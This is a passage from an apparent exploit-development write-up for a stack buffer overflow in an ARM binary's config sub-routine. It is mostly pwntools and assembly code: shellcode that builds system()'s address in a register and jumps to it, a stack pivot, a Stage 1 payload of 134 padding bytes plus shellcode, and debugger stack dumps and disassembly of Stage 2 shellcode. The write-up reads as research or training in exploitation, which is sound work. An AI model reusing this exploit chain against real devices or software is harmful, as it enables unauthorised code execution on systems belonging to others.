q,w,e,r = unpack('4B',pack('>I',system))
load_system = asm("""
mov r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov pc, r6
""" % (q,w,e,r))

```

There is a high chance that the generated shellcode would not contain bad-bytes.

### Stack pivot

Having fixed the registers to allow us to safely return to the 0x9AC4 (config) sub-routine, we still have to figure out a way to trigger the **Stage 2** shellcode.

![a54c.png](/media/images/a54c.width-800.png)

If we attempt to exit before returning, the sub-routine must readjust the stack to its initial state (before the function call), so the program can continue with its normal flow. The epilogue will perform two instructions, that will move the stack pointer by hex 0x254 (readjust) and will pop the values from the stack into the R4-R11 registers, among with the most important one - program counter:

![9ac4_epilogue.png](/media/images/9ac4_epilogue.width-800.png)

We've noticed that after the overflow happens, there are heap pointers stored on the stack at multiple locations. One of which is particularly interesting:

```
0xcea062a0│+0x0250: 0x00000000
0xcea062a4│+0x0254: 0x00000073 ("s"?)
0xcea062a8│+0x0258: 0x00000000
0xcea062ac│+0x025c: 0x00000020
0xcea062b0│+0x0260: 0x00000000
0xcea062b4│+0x0264: 0x00000001
0xcea062b8│+0x0268: 0x00000013
0xcea062bc│+0x026c: 0x00010000
0xcea062c0│+0x0270: 0x00000003
0xcea062c4│+0x0274: 0x00000008
0xcea062c8│+0x0278: 0x00000008
0xcea062cc│+0x027c: 0x00000008
0xcea062d0│+0x0280: 0x00000008
0xcea062d4│+0x0284: 0x00000008
0xcea062d8│+0x0288: 0x00000008
0xcea062dc│+0x028c: 0x00000008
0xcea062e0│+0x0290: 0x00000008
0xcea062e4│+0x0294: 0xcea06430  →  0x00016170  →  0x00000000
0xcea062e8│+0x0298: 0x00016170  →  0x00000000
0xcea062ec│+0x029c: 0x00000000
0xcea062f0│+0x02a0: 0x00000000

```

This would be a good candidate for populating the R4-R11 registers along with PC. We do not control the content of the R4-R10 registers, however, we do control the Frame Pointer (R11) and PC (Program Counter) - therefore, it will be trivial to redirect the program flow.

The pivoting must be done in the **Stage 1** shellcode, before we return to the config sub-routine from `puts()`. A calculated pivot that will tailor the stack for our needs:

```
pivot = asm('sub sp,sp, #964;')

```

For sanity, the final payload for **Stage1** will be as follows:

```
sc = pivot + fix_regs + load_puts_got + jmp_puts
payload = b'A'*134 + sc

```

The following figure shows the moment of the POP instruction with a pivoted stack:

```

The R4-R11 registers are going to be populated with words from the stack starting at offset 0x0; finally popping the heap pointer at offset 0x20 into the program counter. The program flow will continue by executing the instructions stored at 0x16170, thus our **Stage2** shellcode:

```
gef➤  x/16i 0x00016170
   0x16170:	mov	r6, #198	; 0xc6
   0x16174:	lsl	r6, r6, #8
   0x16178:	add	r6, r6, #213	; 0xd5
   0x1617c:	lsl	r6, r6, #8
   0x16180:	add	r6, r6, #254	; 0xfe
   0x16184:	lsl	r6, r6, #8
   0x16188:	add	r6, r6, #176	; 0xb0
   0x1618c:	ror	r0, r6, r2
   0x16190:	mov	r6, #198	; 0xc6

   0x161a8:	add	r6, r6, #76	; 0x4c
   0x161ac:	mov	pc, r6
